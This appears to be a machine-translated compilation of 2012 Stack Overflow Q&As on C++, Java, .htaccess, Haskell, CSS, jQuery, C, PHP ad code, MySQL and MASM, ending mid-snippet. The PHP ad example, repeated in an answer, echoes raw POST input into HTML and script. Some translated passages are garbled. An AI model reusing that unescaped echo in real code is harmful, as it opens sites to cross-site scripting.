[这是我为实现Eratosthenes 的 Sieve](http://en.wikipedia.org/wiki/Sieve_of_Eratosthenes)编写的一些代码：

```
#include <iostream>
#include <vector>
#include <cmath>
#include <cassert>
#include <cstdlib>

int allPrimes (unsigned long n) {
    std::vector<int> track (n, 0);
    int index = 2;
    int m = sqrt(n);
    while(index < n) {
        if (track[index] == 0) {
            std::cout << index << std::endl;
            int mul = 1;
            while ((index <= m) && (n >= (index * ++mul))) {
                track[index * mul] = 1;
            }
        }
        index++;
    }
}

int main() {
    int num;
    std::cin >> num;
    allPrimes(num);
} 
```

奇怪的是，无论何时`num`在系列 6、10、14、18、22... 中，代码都会在释放内存时随以下堆栈中止（对于 other 运行正常`n`）：

```
raise () from /lib64/libc.so.6
abort () from /lib64/libc.so.6
__libc_message () from /lib64/libc.so.6
malloc_printerr () from /lib64/libc.so.6
_int_free () from /lib64/libc.so.6
__gnu_cxx::new_allocator<int>::deallocate
std::_Vector_base<int, std::allocator<int> >::_M_deallocate
std::_Vector_base<int, std::allocator<int> >::~_Vector_base
std::vector<int, std::allocator<int> >::~vector
allPrimes (n=6) at allprimes.cpp:20
main () at allprimes.cpp:26 
```

但我没有看到错误，也看不到这些数字背后的逻辑，它们之间的间隔为 4。这里的错误是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-30T08:51:06.597

这里：

```
while(index <= n) {
    if (track[index] == 0) { 
```

你允许`index`跑到`n`，这是超出范围的。你需要`n-1`，或`while (index < n)`。代码中还有其他此类索引错误，所有这些都会导致未定义的行为。

# java - 如何像守护线程一样启动Java主线程？

> ID：12659947
> 
> 赞同：1
> 
> 时间：2012-09-30T08:49:07.517
> 
> 标签：java, multithreading, daemon

我需要在不使用 jsvc 的情况下像后台进程一样启动我的 java 类。我怎么能这样做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T08:53:44.507

在 linux 中，您可以轻松地做到这一点：

```
java -jar myjar.jar & 
```

在 Windows 下，您可以尝试使用`javaw`而不是`java`：

```
javaw -jar myjar.jar 
```

否则，您将需要[Apache Commons Daemon](http://commons.apache.org/daemon/jsvc.html)服务或守护程序包装器。

# .htaccess - 如何在 htaccess 中使用 301 重定向来停止 404 错误？

> ID：12659949
> 
> 赞同：0
> 
> 时间：2012-09-30T08:49:20.837
> 
> 标签：.htaccess, mod-rewrite, redirect

我有两个同名但 TLD 不同的域，例如 .com 和 .net。我正在使用“.com”域上的博客和“.net”域上的论坛，例如

站点 1：“http://www.mywebsite.com/”（博客） 站点 2：“http://www.mywebsite.net/forum”（论坛）

我在使用 Google 网站管理员工具时遇到问题，网站管理员工具试图将我的 .com 域抓取为像“www.mydomain.com/forum”这样托管的论坛，但是 .com 域上不存在论坛。它存在于.net 域中。所以它会产生404错误。

请让我知道一些代码以将“.com/forum/ {Plus Queries} /”重定向到确切的“.net/forum/{ Destination }”，我相信它有助于标记删除 404 错误或有助于防止更多错误。

但是，今天我将 robots.txt 设置为禁用 Google 在“.com/forum”上的抓取

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T19:32:58.117

*在.com*域的文档根目录中的 htaccess 文件中，添加：

```
Redirect 301 /forum http://www.mywebsite.net/forum 
```

如果两个域共享同一个文档根目录，从而共享同一个 htaccess 文件，那么您需要使用 mod_rewrite 而不是 mod_alias 对主机进行额外检查：

```
RewriteEngine On
RewriteCond %{HTTP_HOST} ^(www\.)?mywebsite\.com$ [NC]
RewriteRule ^/?forum/(.*)$ http://www.mywebsite.net/forum/$1 [L,R=301] 
```

# haskell - 这段混淆的 Haskell 代码是如何工作的？

> ID：12659951
> 
> 赞同：93
> 
> 时间：2012-09-30T08:50:04.007
> 
> 标签：haskell

在阅读[https://en.uncyclopedia.co/wiki/Haskell](https://en.uncyclopedia.co/wiki/Haskell)（并忽略所有“冒犯性”的东西）时，我偶然发现了以下一段混淆代码：

```
fix$(<$>)<$>(:)<*>((<$>((:[{- thor's mother -}])<$>))(=<<)<$>(*)<$>(*2))$1 
```

`ghci`当我在（导入`Data.Function`and之后`Control.Applicative`）运行那段代码时，`ghci`会打印出 2 的所有幂的列表。

这段代码是如何工作的？

* * *

## 回答 #1

> 赞同：222
> 
> 时间：2012-09-30T10:26:44.540

首先，我们有一个可爱的定义

```
x = 1 : map (2*) x 
```

如果您以前从未见过它，这本身就有点令人费解。无论如何，这是一个相当标准的懒惰和递归技巧。现在，我们将摆脱使用`fix`, 和 point-free-ify 的显式递归。

```
x = fix (\vs -> 1 : map (2*) vs)
x = fix ((1:) . map (2*)) 
```

我们要做的下一件事是扩展该`:`部分并使`map`不必要的复杂。

```
x = fix ((:) 1 . (map . (*) . (*2)) 1) 
```

好吧，现在我们有该常量的两个副本`1`。那永远不会，所以我们将使用阅读器应用程序去重复它。此外，函数组合有点垃圾，所以让`(<$>)`我们尽可能地替换它。

```
x = fix (liftA2 (.) (:) (map . (*) . (*2)) 1)
x = fix (((.) <$> (:) <*> (map . (*) . (*2))) 1)
x = fix (((<$>) <$> (:) <*> (map <$> (*) <$> (*2))) 1) 
```

接下来：这个调用`map`太可读了。但是没有什么好害怕的：我们可以使用单子定律来扩展它。特别是`fmap f x = x >>= return . f`，所以

```
map f x = x >>= return . f
map f x = ((:[]) <$> f) =<< x 
```

我们可以点自由化，替换`(.)`为`(<$>)`，然后添加一些虚假部分：

```
map = (=<<) . ((:[]) <$>)
map = (=<<) <$> ((:[]) <$>)
map = (<$> ((:[]) <$>)) (=<<) 
```

在我们上一步中代入这个方程：

```
x = fix (((<$>) <$> (:) <*> ((<$> ((:[]) <$>)) (=<<) <$> (*) <$> (*2))) 1) 
```

最后，你打破你的空格键并产生美妙的最终方程

```
x=fix(((<$>)<$>(:)<*>((<$>((:[])<$>))(=<<)<$>(*)<$>(*2)))1) 
```

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2013-02-09T01:03:49.143

正在写一个很长的答案，其中包含了导致最终代码的 IRC 实验日志的完整运行（这是在 2008 年初），但我不小心把所有的文本都写了:) 不过损失并不大 - 对于丹尼尔的大部分分析都是正确的。

这是我开始的：

```
Jan 25 23:47:23 <olsner>        @pl let q = 2 : map (2*) q in q
Jan 25 23:47:23 <lambdabot>     fix ((2 :) . map (2 *)) 
```

差异主要归结为重构发生的顺序。

*   `x = 1 : map (2*) x`我不是从. `2 : map ...`_ _ “使地图变得不必要的复杂”步骤并没有发生（那么早）。`(*2)``$2``$1`
*   我使用 liftM2 而不是 liftA2
*   `map`在用 Applicative 组合器替换 liftM2 之前放入了混淆函数。这也是所有空间消失的时候。
*   甚至我的“最终”版本也`.`留下了很多用于功能组合的东西。`<$>`在这与非百科全书之间的几个月里，显然发生了替换所有这些的事情。

顺便说一句，这是一个不再提及数字的更新版本`2`：

```
fix$(<$>)<$>(:)<*>((<$>((:[{- Jörð -}])<$>))(=<<)<$>(*)<$>(>>=)(+)($))$1 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2019-12-05T07:22:39.543

这两个答案都从突然给出的简短原始代码中派生出混淆的代码片段，但问题实际上是在询问冗长的混淆代码如何完成其​​工作。

就是这样：

```
fix$(<$>)<$>(:)<*>((<$>((:[{- thor's mother -}])<$>))(=<<)<$>(*)<$>(*2))$1 
= {- add spaces, remove comment -}
fix $ (<$>) <$> (:) <*> ( (<$> ((:[]) <$>) ) (=<<)  <$>  (*)  <$>  (*2) ) $ 1 
--                      \__\______________/_____________________________/
= {-    A   <$> B   <*> C                          $ 1   =   A (B 1) (C 1) -}
fix $ (<$>) (1 :)     ( ( (<$> ((:[]) <$>) ) (=<<)  <$>  (*)  <$>  (*2) ) 1 )
--                      \__\______________/____________________________/
= {- (<$>) A B = (A <$> B) ; (<$>    B)      A = (A <$> B)  -}
fix $ (1 :) <$>  ( (((=<<) <$> ((:[]) <$>) )        <$>  (*)  <$>  (*2) ) 1 )
--                  \\____________________/____________________________/
= {- <$> is left associative anyway -}
fix $ (1 :) <$>  ( ( (=<<) <$> ((:[]) <$>)          <$>  (*)  <$>  (*2) ) 1 )
--                  \__________________________________________________/
= {-                            A <$> foo = A . foo when foo is a function -}
fix $ (1 :) <$>  ( ( (=<<) <$> ((:[]) <$>)           .   (*)   .   (*2) ) 1 )
--                  \__________________________________________________/
= {-                 ((:[]) <$>) = (<$>) (:[]) = fmap (:[])  is a function -}
fix $ (1 :) <$>  ( ( (=<<)  .  ((:[]) <$>)           .   (*)   .   (*2) ) 1 )
--                  \__________________________________________________/
= {-               (  A     .      B  .  C .  D) 1  =  A  (B  (C  (D  1))) -}
fix $ (1 :) <$>      (=<<)  (  ((:[]) <$>)           (   (*)   (   (*2)   1 )))
= {-                                                    (*2) 1 = (1*2) = 2 -}
fix $ (1 :) <$>      (=<<)  (  ((:[]) <$>)           (   (*)   2             ))
= {-                                                     (*)   2 = (2*)    -}
fix $ (1 :) <$>      (=<<)  (  ((:[]) <$>)              (2*)                  )
= {-                           (  A   <$>)               B  =   A <$> B    -}
fix $ (1 :) <$>      (=<<)  (   (:[]) <$>               (2*)                  )
= {-                     A <$> foo = A . foo   when foo is a function      -}
fix $ (1 :) <$>      (=<<)  (   (:[])  .                (2*)                  )
= {-              (f . g) = (\ x -> f (g x))                               -}
fix $ (1 :) <$>      (=<<)  (\ x -> [2*x]  )
= {-                 (=<<)   A    =   (   A   =<<)                         -}
fix $ (1 :) <$>           ( (\ x -> [2*x]  )  =<<) 
```

这`( (\ x -> [2*x]) =<<) = (>>= (\ x -> [2*x])) = concatMap (\ x -> [2*x]) = map (2*)`是一个函数，所以再次，`<$> = .`：

```
= 
fix $ (1 :)  .  map (2*)
= {- substitute the definition of fix -}
let xs = (1 :) . map (2*) $ xs in xs
=
let xs = 1 : [ 2*x | x <- xs] in xs
= {- xs = 1 : ys -}
let ys =     [ 2*x | x <- 1:ys] in 1:ys
= {- ys = 2 : zs -}
let zs =     [ 2*x | x <- 2:zs] in 1:2:zs
= {- zs = 4 : ws -}
let ws =     [ 2*x | x <- 4:ws] in 1:2:4:ws
=
iterate (2*) 1
= 
[2^n | n <- [0..]] 
```

都是*2*的幂，按升序排列。

* * *

这使用

*   `A <$> B <*> C $ x = liftA2 A B C x`并且由于`liftA2 A B C`应用于`x`它是一个函数，因此它意味着一个作为函数`liftA2 A B C x = A (B x) (C x)`。

*   `(f `op` g) = op f g = (f `op`) g = (`op` g) f`是[运算符部分的三个定律](https://stackoverflow.com/a/56956132/849891)

*   `>>=`是一元绑定，因为`(`op` g) f = op f g`和类型是

    ```
     (>>=)                :: Monad m => m a -> (a -> m b ) -> m b
     (\ x -> [2*x])       :: Num t   =>         t -> [ t]
     (>>= (\ x -> [2*x])) :: Num t   => [ t]               -> [ t] 
    ```

通过类型应用和替换，我们看到有问题的 monad 是`[]`for which `(>>= g) = concatMap g`。

*   `concatMap (\ x -> [2*x]) xs` 被简化为

    ```
     concat $ map (\ x -> [2*x]) 
     =
     concat $ [ [2*x] | x <- xs]
     =
              [  2*x  | x <- xs]
     =
              map (\ x ->  2*x ) 
    ```

*   根据定义，

    ```
     (f . g) x  =  f (g x)

     fix f  =  let x = f x in x

     iterate f x  =  x : iterate f (f x)
                  =  x : let y = f x in 
                         y : iterate f (f y)
                  =  x : let y = f x in 
                         y : let z = f y in 
                             z : iterate f (f z)
                  = ...
                  = [ (f^n) x | n <- [0..]] 
    ```

在哪里

```
 f^n  =  f  .  f  .  ...  . f
            --     \_____n_times _______/ 
```

以便

```
 ((2*)^n) 1  =  ((2*) . (2*) .  ...  . (2*)) 1
                =    2*  (  2*  (  ...  (  2*   1 )...)) 
                =    2^n   ,  for n in [0..] 
```

# html - css中是否有与背景图像等效的前景？

> ID：12659953
> 
> 赞同：57
> 
> 时间：2012-09-30T08:50:08.623
> 
> 标签：html, css, foreground

我想为网页上的元素添加一些亮点。如果我不必向页面添加额外的 html，我会更喜欢。我希望图像出现在元素的前面而不是后面。最好的方法是什么？

* * *

## 回答 #1

> 赞同：75
> 
> 时间：2012-09-30T09:15:21.323

要实现“前景图像”（无需额外的 HTML 代码），您可以使用伪元素 ( `::before`/ `:before`)**加上 CSS[`pointer-events`](https://developer.mozilla.org/en-US/docs/CSS/pointer-events)**。需要最后一个属性，以便用户可以“好像它不存在”实际单击该层。

这是一个示例（使用 alpha 通道为 50% 的颜色，以便您可以看到真实元素实际上可以被聚焦）。[http://jsfiddle.net/JxNdT/](http://jsfiddle.net/JxNdT/)

```
#cont {
        width: 200px;
        height: 200px;
        border: 1px solid #aaa; /*To show the boundaries of the element*/
    }
    #cont:before {
        position: absolute;
        content: '';
        background: rgba(0,0,0, 0.5); /*partially transparent image*/
        width: 200px;
        height: 200px;
        pointer-events: none;
    }
```

```
 <div id="cont">
    Test<br>
    <input type="text" placeholder="edit">
    </div>
```

PS。我选择了`::before`伪元素，因为这自然会导致正确的定位。如果我选择`::after`，那么我必须添加`position:relative;`到真实元素 ( `#cont`) 和`top:0;left:0;`伪元素 ( `::after`)。

* * *

聚苯乙烯。为了**在没有固定大小的元素上获得前景效果**，需要一个额外的元素。此包装器元素需要`position:relative;display:inline-block;`样式。将伪元素的`width`and设置为，伪元素将拉伸到包装元素的宽度和高度。演示：http: [//jsfiddle.net/JxNdT/1/](http://jsfiddle.net/JxNdT/1/)。`height``100%`

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-30T08:53:17.977

你可以使用这个CSS

```
#yourImage
{
z-index: 1; 
} 
```

**笔记**

将 设置`z-index`为索引大于`z-index`您放置图像的元素的 。

如果你没有指定任何`z-index`那么`1`会做这项工作。

您也可以设置`z-index`为`-1`，在这种情况下，图像将始终位于`background`！

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2016-09-27T12:51:16.100

如果你需要一个白色透明的前景

这适用于像我这样正在考虑向元素添加白色透明前景以传达它被隐藏/禁用的未来访问者。您通常可以通过简单地降低`opacity`以下 1 来实现您的目标：

```
.is-hidden {
    opacity: 0.5;
}
```

```
visible
<span class="is-hidden">hidden</span>
visible
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-10-25T12:08:29.050

[一个巧妙的解决方案：box-sizing + padding-left，在css-tricks](https://css-tricks.com/replace-the-image-in-an-img-with-css/)中查看更多信息

在您的 HTML 中的某处：

```
<img id="test_replacement" src="test.png" alt="test" /> 
```

用于替换图像的 CSS（悬停时）

```
#test_replacement {
    width: 200px; //must be the size of your image (and the replacement one)
    height: 200px; //idem
    display: block;
}
#test_replacement:hover {
    box-sizing: border-box;
    background-image: url('somewhere/other_image.png');
    padding-left: 200px; //at least the size of the width
} 
```

# jquery - jQuery 中的输入[type="submit"]

> ID：12659959
> 
> 赞同：19
> 
> 时间：2012-09-30T08:50:35.203
> 
> 标签：jquery, css

这该怎么做：

```
input[type="submit"] {
   color:green;
} 
```

在 jQuery 中？

```
$('input[type="submit"]').css("color","green"); 
```

不工作：|

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2012-09-30T08:53:09.240

可能是因为它在 jQuery “准备好”之前触发。试试这个：

```
$(function() {
    $('input[type="submit"]').css("color","green");
}); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-30T09:09:45.600

使用简单的 css 而不是 javascript

```
input[type="submit"]{
        color: green;
        cursor: pointer;
        font: bold 12px Helvetica,Arial,sans-serif;
    } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-30T09:08:50.030

但是jquery必须在此之前加载它

您也可以通过在提交中添加 id 或类来完成此操作

```
 $('#submit_id/.submit_class').css("color","green"); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-07-06T03:16:19.043

尝试添加这个：

```
$("form").submit(function(event) {
   event.preventDefault();
}); 
```

可能是您的原始代码正在运行，但是由于当您单击表单中的提交按钮时页面会正常重新加载，因此该操作会阻止您看到您的更改。

# c - 编译器警告，打开文件

> ID：12659961
> 
> 赞同：1
> 
> 时间：2012-09-30T08:50:42.707
> 
> 标签：c

```
#include <stdlib.h>
#include <stdio.h>
#include <getopt.h>
#include "mylib.h"
#include "tree.h"

/* A boolean type which can be TRUE or FALSE */
typedef enum bool_e {FALSE, TRUE} bool_t;

static void usage(char *progname);
static void setup(int argc, char **argv, char **filename, bool_t *rbt,
                  bool_t *do_depth, bool_t *p_order, bool_t *output_graph);
static void make_graph(char *filename, tree t);

static void usage(char *prog_name) {
   fprintf(stderr, "Usage: %s [OPTION]... <STDIN>\n\n%s%s", prog_name,
           "Perform various operations using a hash-table.  By default read\n"
           "words from stdin and print them with their frequencies to stdout.\n\n"
           " -d       prints the tree depth\n"
           " -p       prints the tree in pre_order\n"
           " -o FILENAME prints output to a specified file\n\n"
           " -r       creates a rbt tree\n"
           " -h       Display this message\n\n");
}

static void print_key(char *key) {
   printf("%s\n", key);
}

static void make_graph(char *filename, tree t) {
   FILE *file = fopen(filename, "w");
   fprintf(stderr, "Creating dot file '%s'\n", filename);
   tree_output_dot(t, file);
   fclose(file);
}

/**
 * Handle options given on the command-line by setting a number of
 * variables appropriately.  May call usage() if incorrect arguments
 * or -h given.
 *
 * @param argc the number of command-line arguments.
 * @param argv an array of strings contain the command-line arguments.
 * @param rbt is created if -r is given
 * @param the tree depth is printed if d is given
 * @param tree_outputfile_dot is called if -o output-filename is given
 */

int main(int argc, char **argv) {
   bool_t rbt = FALSE, do_depth = FALSE, p_order = FALSE, output_graph = FALSE;
   tree_t tree_type = BST;
   tree t;
   char word[256];
   char *dot_filename;

   setup(argc, argv, &dot_filename, &rbt, &do_depth, &p_order, &output_graph);
   if (rbt) {
     t = tree_new(RBT);
   } else {
      t = tree_new(tree_type);
   }
   while ((getword(word, sizeof word, stdin)) != EOF) {
      t = tree_insert(t, word);
   }

   if (do_depth) {
      printf("%d\n", tree_depth(t));
   } else if (p_order) {
      tree_preorder(t, print_key);
   } else if (output_graph) {
       make_graph(dot_filename, t);
    } else {
      tree_inorder(t, print_key);
   }

   t = tree_free(t);
   return EXIT_SUCCESS;
}

static void setup(int argc, char **argv, char **filename, bool_t *rbt,
                  bool_t *do_depth, bool_t *p_order, bool_t *output_graph) {
   const char *optstring = "do:prh";

   char option;

   while ((option = getopt(argc, argv, optstring)) != EOF) {
      switch (option) {
      case 'd':
        *do_depth = TRUE;
         break;
      case 'o':
         *filename = optarg;
         *output_graph = TRUE;
         break;
      case 'p':
         *p_order = TRUE;
         break;
      case 'r':
         *rbt = TRUE;
         break;
      case 'h':
      default:
         usage(argv[0]);
         exit(EXIT_SUCCESS);
      }
   }
} 
```

大家好，我正在尝试编译此代码，但遇到了一个我不知道如何解决的问题。我的文件编译时出现一个警告，我想对其进行补救。

main.c：在函数'main'中：main.c：56：警告：'dot_filename'可能在此函数中未初始化使用

我不确定如何解决这个问题，我通常不经常使用文件打开的东西，而且我不确定该怎么做。我该怎么做才能让这个警告消失？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-30T08:55:07.570

您可以简单地使用空指针初始化 dot_filename。

```
char *dot_filename = NULL; 
```

那应该可以解决警告。

# jquery - jquery 在一个 div 中附加 DFP 广告管理系统 (DFP) 广告

> ID：12659962
> 
> 赞同：0
> 
> 时间：2012-09-30T08:51:02.403
> 
> 标签：jquery, append, google-dfp

我正在使用[DFP 广告管理系统 (DFP) 广告](http://www.google.com/dfp/info/sb/index.html)，但是当我使用 时`jquery append`，加载`DoubleClick for Publishers (DFP) ads`到一个 div 中，广告块是空的。怎么做才能让广告正常显示？

[演示链接](http://www.freenewspos.com/italia/1.php)

谢谢。

```
<?php header("Content-type: text/html; charset=utf-8"); ?>
<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
<?php if(!$_POST['number']){ ?>
<script type='text/javascript' src='https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js?ver=1.7.2'></script>
<script type='text/javascript'>
    var googletag = googletag || {};
    googletag.cmd = googletag.cmd || [];
    (function() {
    var gads = document.createElement('script');
    gads.async = true;
    gads.type = 'text/javascript';
    var useSSL = 'https:' == document.location.protocol;
    gads.src = (useSSL ? 'https:' : 'http:') + 
    '//www.googletagservices.com/tag/js/gpt.js';
    var node = document.getElementsByTagName('script')[0];
    node.parentNode.insertBefore(gads, node);
    })();
</script>
<script type='text/javascript'>
    googletag.cmd.push(function() {
        googletag.pubads().enableAsyncRendering();
        googletag.defineSlot('/17177879/ads_300_250_white_right', [300, 250], 'div-gpt-ad-1-1').addService(googletag.pubads());
        googletag.pubads().enableSingleRequest();
        googletag.enableServices();
    });
</script>
<script type="text/javascript">
jQuery(document).ready(function(){
    $(".bnews").live('click',function(){
        var nnum = $(this).attr('rel');
        googletag.cmd.push(function() {
            googletag.pubads().enableAsyncRendering();
            googletag.defineSlot('/17177879/ads_300_250_white_right', [300, 250], 'div-gpt-ad-' + nnum + '-1').addService(googletag.pubads());
            googletag.pubads().enableSingleRequest();
            googletag.enableServices();
        });
        $(this).css('display','none');
        $.ajax({
            url: "1.php", 
            dataType: "html",
            type: 'POST',
            data: 'number=' + nnum,
            success: function(data){ 
                $("#cc-wrap").append(data); 
            }               
        });
    });
});
</script>
<h1 class="bnews" rel="2">Append to div</h1>
<!-- some content here -->
<!-- ads_300_250_white_right -->
<div id='div-gpt-ad-1-1' style='width:300px; height:250px;'>
<script type='text/javascript'>
googletag.cmd.push(function() { googletag.display('div-gpt-ad-1-1'); });
</script>
<div id="cc-wrap"></div>
<?php }else{ ?>
<h1 class="bnews" rel="<?php echo ($_POST['number']+1); ?>">Append to div</h1>
<!-- some content here -->
<!-- ads_300_250_white_right -->
<div id='div-gpt-ad-<?php echo $_POST["number"]; ?>-1' style='width:300px; height:250px;'>
<script type='text/javascript'>
googletag.cmd.push(function() { googletag.display('div-gpt-ad-<?php echo $_POST["number"]; ?>-1'); });
</script>
<?php } ?> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-02T17:00:19.853

您需要删除对 googletag.pubads().enableSingleRequest() 函数的两个调用...看起来这会阻止您在附加后请求更多广告。当我在您使用它的两个地方注释掉那段代码时，脚本开始工作......虽然它似乎仍然有点坏。

这是您的示例，带有注释的行，以便它可以工作：

```
<?php header("Content-type: text/html; charset=utf-8"); ?>
<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
<?php if(!$_POST['number']){ ?>
<script type='text/javascript' src='https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js?ver=1.7.2'></script>
<script type='text/javascript'>
    var googletag = googletag || {};
    googletag.cmd = googletag.cmd || [];
    (function() {
    var gads = document.createElement('script');
    gads.async = true;
    gads.type = 'text/javascript';
    var useSSL = 'https:' == document.location.protocol;
    gads.src = (useSSL ? 'https:' : 'http:') +
    '//www.googletagservices.com/tag/js/gpt.js';
    var node = document.getElementsByTagName('script')[0];
    node.parentNode.insertBefore(gads, node);
    })();
</script>
<script type='text/javascript'>
    googletag.cmd.push(function() {
        googletag.pubads().enableAsyncRendering();
        googletag.defineSlot('/17177879/ads_300_250_white_right', [300, 250], 'div-gpt-ad-1-1').addService(googletag.pubads());
        //googletag.pubads().enableSingleRequest();
        googletag.enableServices();
    });
</script>
<script type="text/javascript">
jQuery(document).ready(function(){
    $(".bnews").live('click',function(){
        var nnum = $(this).attr('rel');
        googletag.cmd.push(function() {
            googletag.pubads().enableAsyncRendering();
            googletag.defineSlot('/17177879/ads_300_250_white_right', [300, 250], 'div-gpt-ad-' + nnum + '-1').addService(googletag.pubads());
            //googletag.pubads().enableSingleRequest();
            googletag.enableServices();
        });
        $(this).css('display','none');
        $.ajax({
            url: "1.php",
            dataType: "html",
            type: 'POST',
            data: 'number=' + nnum,
            success: function(data){
                $("#cc-wrap").append(data);
            }
        });
    });
});
</script>
<h1 class="bnews" rel="2">Append to div</h1>
<!-- some content here -->
<!-- ads_300_250_white_right -->
<div id='div-gpt-ad-1-1' style='width:300px; height:250px;'>
<script type='text/javascript'>
googletag.cmd.push(function() { googletag.display('div-gpt-ad-1-1'); });
</script>
<div id="cc-wrap"></div>
<?php }else{ ?>
<h1 class="bnews" rel="<?php echo ($_POST['number']+1); ?>">Append to div</h1>
<!-- some content here -->
<!-- ads_300_250_white_right -->
<div id='div-gpt-ad-<?php echo $_POST["number"]; ?>-1' style='width:300px; height:250px;'>
<script type='text/javascript'>
googletag.cmd.push(function() { googletag.display('div-gpt-ad-<?php echo $_POST["number"]; ?>-1'); });
</script>
<?php } ?> 
```

如果您还有其他问题，请告诉我。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-07T10:12:49.717

只需将广告块放入 iframe 即可，您不能只复制 Google 广告代码脚本

# html - 页脚无法在 html 中正确显示

> ID：12659963
> 
> 赞同：0
> 
> 时间：2012-09-30T08:51:05.520
> 
> 标签：html, css, sidebar

我正在使用两列布局。一列用于主要内容，一列用于侧边栏

在 html 中，我使用以下代码

```
<div id="content">
     <div id="main-content">
       -----------
       -----------
     </div>

     <div id="sidebar">
      -----------
      ----------
      </div>

 </div>

 <div id="footer">
   ----------
   ----------
 </div> 
```

CSS 文件由以下代码组成

```
 #content
{
padding-top:100px;
padding-bottom:50px;
width:1000px;
    margin:0px auto;

}

  #main-content
{

width:720px;
padding-top:250px;
    padding-bottom:30px;
    padding-right:20px;
position : absolute;
}

 #sidebar

{
float:right;
width:270px;
    padding-top:250px;
    padding-bottom:30px;

}

 #footer
{
background: url(../images/footer.jpg) repeat-x;
    width:100%;
clear:both;
    margin:auto;

} 
```

页脚代码显示在页面中间，可能在您可以[在此处](http://jhakas.in/Forex/calender.html)看到的侧边栏的末尾。页脚为黑色。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T09:04:22.123

`position: absolute`在`#main-content`CSS 中删除。你不需要它。如果您绝对定位一个元素，那么这超出了文档流。

在这种情况下，如果您设置`position: absoulte`，`#main-content`则忽略其高度以呈现页脚。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-30T09:04:14.193

删除`padding-right: 20px`和`position: absolute`属性`div.#main-content`

# java - 如何在我的程序中删除此错误为什么会出现？

> ID：12659965
> 
> 赞同：-2
> 
> 时间：2012-09-30T08:51:26.357
> 
> 标签：java

![在此处输入图像描述](../Images/579456f37455dcb45c9147c7cf999590.png) 这是我编写的代码，显示错误，如图帮助我。

```
class palindrome
{
public static void main(String args[])

  {
    StringBuffer sb = new StringBuffer("nitin");
    System.out.println(sb);
    String sb1=sb.reverse();//error coming in this line why ?
    if(sb1.contentEquals(sb))
        {
        System.out.println("palindrome");
        }
    else
        {
        System.out.println("not a palindrome");
        }
  }
} 
```

![在此处输入图像描述](../Images/28f908c5583bb24893159033a8f2b251.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T08:53:02.933

改变

```
sb.reverse()// This will return a reference to StringBuffer 
```

到

```
sb.reverse().toString()//This will convert it to a String 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-30T08:53:54.560

您需要在分配给字符串之前将字符串缓冲区转换为字符串类型

试试这个

```
sb.reverse().toString() 
```

# mysql - 即使为空也显示值

> ID：12659970
> 
> 赞同：3
> 
> 时间：2012-09-30T08:52:31.150
> 
> 标签：mysql, sql

我正在使用以下内容来显示过去 7 天内添加的产品数量...即使 COUNT=0，我能否以某种方式调整查询以显示过去 7 天的所有内容？

按现状查询：

```
SELECT DAYNAME(dateadded) DAY, COUNT(*) COUNT 
FROM `products` 
WHERE (`dateadded` BETWEEN DATE_SUB(CURDATE(), INTERVAL 7 DAY) AND CURDATE() && site_url = 'mysite.com') 
GROUP BY DAY(dateadded) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T08:56:11.670

添加一个包含日期的表（日期查找表），然后：

```
SELECT DAYNAME(d.FullDate) DAY, COUNT(*) COUNT
FROM dates d
LEFT OUTER JOIN products p ON d.FullDate = DATE(p.dateadded) 
    AND p.site_url = 'mysite.com'
WHERE d.FullDate BETWEEN DATE_SUB(CURDATE(), INTERVAL 7 DAY) AND CURDATE()    
GROUP BY d.FullDate 
```

是的，它需要一点存储空间，但它会使这样的查询变得容易得多。

或者，您可以创建一个存储过程，循环遍历 7 天前和今天之间的日期，并为每个日期返回一行。

# x86 - 区分 MASM 中的 x64 和 x86 模式

> ID：12659972
> 
> 赞同：5
> 
> 时间：2012-09-30T08:52:50.147
> 
> 标签：x86, 64-bit, masm

我有可以使用 masm（ml.exe 或 ml64.exe）为 x64 和 x86 组装的 asm 文件。masm 中是否有一些预定义的宏来检测正在为 x64 组装的文件？现在我手动定义了 _WIN64 然后对其进行测试，但必须有更好的方法来检查它。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-25T06:29:44.903

您可以尝试测试是否定义了 RAX，正如对这个类似问题的答案之一所建议的那样：[Detecting architecture at compile time from MASM/MASM64](https://stackoverflow.com/questions/2595550/detecting-architecture-at-compile-time-from-masm-masm64/9155436#9155436)

我使用这个技巧来创建一个变量，该变量将阻止我的 x64 asm 代码在 x32 版本中组装

```
IFDEF RAX
    END_IF_NOT_X64 equ <>
ELSE
    END_IF_NOT_X64 equ end  ; kill stop the assembler if we're not compiling for x64
ENDIF

END_IF_NOT_X64

; x64 code... 
```

# yii - 为什么我的 json_encode 损坏了

> ID：12659980
> 
> 赞同：0
> 
> 时间：2012-09-30T08:53:27.003
> 
> 标签：yii, json, ajax-upload, phpthumb

```
 $model = new XUploadForm;
            $model->file = CUploadedFile::getInstance( $model, 'file' );
            //We check that the file was successfully uploaded
            if( $model->file !== null ) {
                //Grab some data
                $model->mime_type = $model->file->getType( );
                $model->size = $model->file->getSize( );
                $model->name = $model->file->getName( );
                $file_extention = $model->file->getExtensionName( );
                //(optional) Generate a random name for our file
                $file_tem_name = md5(Yii::app( )->user->id.microtime( ).$model->name);
